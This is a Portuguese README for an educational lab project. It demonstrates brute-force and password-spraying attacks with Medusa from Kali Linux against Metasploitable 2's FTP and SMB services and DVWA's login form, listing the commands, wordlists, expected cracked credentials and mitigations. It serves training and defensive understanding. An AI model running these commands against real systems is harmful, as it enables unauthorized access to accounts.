# desafio_dio_brute_force_medusa

# 📘 **README — Projeto de Ataques de Força Bruta com Kali Linux + Medusa**

Este projeto demonstra, em ambiente controlado, como realizar ataques de força bruta usando **Kali Linux**, **Medusa** e ambientes vulneráveis como **Metasploitable 2** e **DVWA**.
O objetivo é **aprender técnicas ofensivas** e **documentar medidas de mitigação**.

---

## 🔧 **1. Ambiente Utilizado**

| Máquina          | Sistema           | Função     | Descrição                           |
| ---------------- | ----------------- | ---------- | ----------------------------------- |
| Kali Linux       | Kali 2025         | Atacante   | Onde os ataques são executados      |
| Metasploitable 2 | Ubuntu Vulnerável | Alvo       | Contém FTP, SMB e DVWA vulneráveis  |
| Rede             | Host-Only         | Isolamento | Apenas máquinas locais se comunicam |

---

## 📡 **2. Configuração da Rede**

Ambas as VMs devem estar configuradas com:

```
VirtualBox → Configurações → Rede → Adaptador 1 → Host-Only Adapter
```

Descobrir IPs:

```bash
ip a            # no Kali
ifconfig        # no Metasploitable
```

---

## 🔍 **3. Descoberta de Serviços com Nmap**

Executar scan inicial:

```bash
nmap -sV 192.168.56.102
```

Serviços esperados:

* FTP (21)
* HTTP/DVWA (80)
* SSH (22)
* SMB (139/445)
* MySQL (3306)

---

# 🧪 **4. Teste 1 — Ataque de Força Bruta em FTP (vsftpd 2.3.4)**

### ✔️ 4.1 Validar serviço

```bash
nmap -sV -p 21 192.168.56.102
```

### ✔️ 4.2 Wordlists simples

**users.txt**

```
msfadmin
anonymous
ftp
user
```

**passwords.txt**

```
msfadmin
123456
password
ftp123
```

### ✔️ 4.3 Ataque com Medusa

```bash
medusa -h 192.168.56.102 -u msfadmin -P passwords.txt -M ftp
```

### ✔️ Resultado esperado

```
ACCOUNT FOUND: Host: 192.168.56.102 User: msfadmin Password: msfadmin
```

### ✔️ 4.4 Validação manual

```bash
ftp 192.168.56.102
```

---

# 🌐 **5. Teste 2 — Ataque de Força Bruta em Formulário Web (DVWA)**

### ✔️ 5.1 Acessar DVWA

Abrir no navegador:

```
http://192.168.56.102/dvwa
```

Login padrão:

* user: `admin`
* pass: `password`

Mudar security level:

```
DVWA Security → Low
```

---

### ✔️ 5.2 Coletar parâmetros do formulário

Via DevTools ou BurpSuite, exemplo:

```
POST /dvwa/login.php
username=admin&password=123&Login=Login
```

---

### ✔️ 5.3 Ataque com Medusa

```bash
medusa -h 192.168.56.102 \
  -U users.txt -P passwords.txt \
  -M web-form \
  -m FORM="/dvwa/login.php" \
  -m USER="username" \
  -m PASS="password" \
  -m DENY="Login failed"
```

### ✔️ Resultado esperado

```
ACCOUNT FOUND: Host: 192.168.56.102 User: admin Password: password
```

---

# 📦 **6. Teste 3 — Password Spraying + Enumeração SMB**

### ✔️ 6.1 Enumerar usuários SMB

```bash
nmap -p 139,445 --script smb-enum-users 192.168.56.102
```

Exemplo de usuários encontrados:

```
msfadmin
postgres
service
user
```

### ✔️ 6.2 Wordlists para spray

**users_smb.txt**

```
msfadmin
postgres
service
user
```

**spray.txt**

```
password
123456
msfadmin
```

### ✔️ 6.3 Password spraying com Medusa

```bash
medusa -h 192.168.56.102 -U users_smb.txt -P spray.txt -M smbnt
```

Resultado esperado:

```
ACCOUNT FOUND: Host: 192.168.56.102 User: msfadmin Password: msfadmin
```

---

# 🛡️ **7. Mitigações Recomendadas**

### 🔐 Autenticação

* Habilitar **MFA**
* Exigir **senhas fortes**
* Aplicar **política de expiração** de senha
* Impor **bloqueio por tentativas falhas**

### 🧱 Infraestrutura

* Desabilitar **SMBv1**
* Restringir serviços necessários
* Isolar serviços críticos

### 👁️ Monitoramento

* IDS/IPS (Snort, Suricata)
* Fail2ban
* Alertas de tentativas suspeitas

### 🌐 Hardening de Aplicações Web

* Usar *CAPTCHA* em formulários
* Limitar tentativas por IP
* Implementar *rate limiting*

---

# 📄 **8. Conclusão**

Este projeto demonstrou como serviços básicos, com senhas fracas e sem mecanismos de proteção, podem ser comprometidos através de:

* Força bruta direcionada (FTP)
* Automação de formulários web (DVWA)
* Password spraying (SMB)

As técnicas aprendidas ajudam no entendimento da perspectiva ofensiva, permitindo implementar defesas mais eficazes.

---

# 📁 **9. Estrutura Sugerida do Projeto**

```
/medusa-bruteforce-project
│
├── readme.md
├── users.txt
├── passwords.txt
├── users_smb.txt
├── spray.txt
├── /prints/
│   ├── ftp_scan.png
│   ├── dvwa_login.png
│   └── smb_enum.png
└── /commands/
    ├── ftp_medusa.txt
    ├── dvwa_medusa.txt
    └── smb_medusa.txt
```
